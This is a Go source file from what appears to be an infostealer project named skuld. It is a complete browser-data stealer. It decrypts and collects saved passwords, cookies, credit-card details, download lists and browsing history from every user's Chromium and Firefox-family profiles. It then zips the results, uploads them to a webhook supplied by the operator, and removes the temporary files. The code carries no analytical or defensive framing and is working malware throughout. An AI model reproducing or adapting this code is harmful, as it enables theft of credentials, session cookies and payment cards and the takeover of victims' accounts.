package browsers

import (
	"fmt"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
	"os"
	"path/filepath"
	"strings"
)

func ChromiumSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetChromiumBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile
			if strings.Contains(path, "Opera") {
				profilesPaths = append(profilesPaths, Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})

			} else {
				folders, err := os.ReadDir(path)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						dir := filepath.Join(path, folder.Name())
						files, err := os.ReadDir(dir)
						if err != nil {
							continue
						}
						for _, file := range files {
							if file.Name() == "Web Data" {
								profilesPaths = append(profilesPaths, Profile{
									Name:    folder.Name(),
									Path:    dir,
									Browser: browser,
								})
							}
						}
					}
				}
			}

			if len(profilesPaths) == 0 {
				continue
			}

			c := Chromium{}
			err := c.GetMasterKey(path)
			if err != nil {
				continue
			}
			for _, profile := range profilesPaths {
				profile.Logins, _ = c.GetLogins(profile.Path)
				profile.Cookies, _ = c.GetCookies(profile.Path)
				profile.CreditCards, _ = c.GetCreditCards(profile.Path)
				profile.Downloads, _ = c.GetDownloads(profile.Path)
				profile.History, _ = c.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func GeckoSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetGeckoBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}
				dir := filepath.Join(path, profile.Name())
				files, err := os.ReadDir(dir)
				if err != nil {
					continue
				}
				if len(files) <= 10 {
					continue
				}

				profilesPaths = append(profilesPaths, Profile{
					Name:    profile.Name(),
					Path:    dir,
					Browser: browser,
				})
			}

			if len(profilesPaths) == 0 {
				continue
			}

			for _, profile := range profilesPaths {
				g := Gecko{}
				g.GetMasterKey(profile.Path)
				profile.Logins, _ = g.GetLogins(profile.Path)
				profile.Cookies, _ = g.GetCookies(profile.Path)
				profile.Downloads, _ = g.GetDownloads(profile.Path)
				profile.History, _ = g.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func Run(webhook string) {
	tempdir := filepath.Join(os.TempDir(), "browsers-temp")
	os.MkdirAll(tempdir, os.ModePerm)

	defer os.RemoveAll(tempdir)

	var profiles []Profile
	profiles = append(profiles, ChromiumSteal()...)
	profiles = append(profiles, GeckoSteal()...)

	if len(profiles) == 0 {
		return
	}

	for _, profile := range profiles {
		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
			continue
		}
		os.MkdirAll(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name), os.ModePerm)

		if len(profile.Logins) > 0 {
			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
			for _, login := range profile.Logins {
				fileutil.AppendFile(fmt.Sprintf("%s\\%s\\%s\\%s\\logins.txt", tempdir, profile.Browser.User, profile.Browser.Name, profile.Name), fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
			}
		}

		if len(profile.Cookies) > 0 {
			for _, cookie := range profile.Cookies {
				var expires string
				if cookie.ExpireDate == 0 {
					expires = "FALSE"
				} else {
					expires = "TRUE"
				}

				var host string
				if strings.HasPrefix(cookie.Host, ".") {
					host = "FALSE"
				} else {
					host = "TRUE"
				}

				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "cookies.txt"), fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
			}
		}

		if len(profile.CreditCards) > 0 {
			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
			for _, cc := range profile.CreditCards {
				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
			}
		}

		if len(profile.Downloads) > 0 {
			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
			for _, download := range profile.Downloads {
				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
			}
		}

		if len(profile.History) > 0 {
			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
			for _, history := range profile.History {
				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
			}
		}

	}
	tempzip := filepath.Join(os.TempDir(), "browsers.zip")
	err := fileutil.Zip(tempdir, tempzip)
	if err != nil {
		return
	}
	defer os.Remove(tempzip)

	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "Browsers",
				"description": fmt.Sprintf("```%s```", fileutil.Tree(tempdir, "")),
			},
		},
	}, tempzip)
}
